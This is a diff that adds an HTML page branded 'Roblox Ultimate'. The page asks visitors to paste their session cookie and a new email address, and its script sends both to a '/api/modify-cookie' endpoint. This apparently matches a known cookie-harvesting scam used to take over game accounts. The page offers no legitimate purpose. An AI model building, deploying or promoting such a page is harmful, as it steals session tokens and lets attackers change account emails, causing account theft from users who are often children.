@@ -1,1 +1,48 @@
-# Website
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Ultimate</title>
+</head>
+<body>
+    <h1>Roblox Ultimate </h1>
+    <form id="cookieForm">
+        <label for="cookie">Enter your Cookie:</label>
+        <textarea id="cookie" name="cookie" required></textarea><br><br>
+        
+        <label for="email">Enter New Email:</label>
+        <textarea id="email" name="email" required></textarea><br><br>
+        
+        <button type="submit">Submit</button>
+    </form>
+    <div id="response"></div>
+    
+    <script>
+        document.getElementById('cookieForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const cookie = document.getElementById('cookie').value;
+            const email = document.getElementById('email').value;
+            
+            fetch('/api/modify-cookie', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ cookie: cookie, email: email })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.modifiedCookie) {
+                    document.getElementById('response').innerText = "Cookie and email modified successfully!";
+                } else {
+                    document.getElementById('response').innerText = "Error modifying cookie or email.";
+                }
+            })
+            .catch(error => {
+                document.getElementById('response').innerText = "An error occurred.";
+            });
+        });
+    </script>
+</body>
+</html>
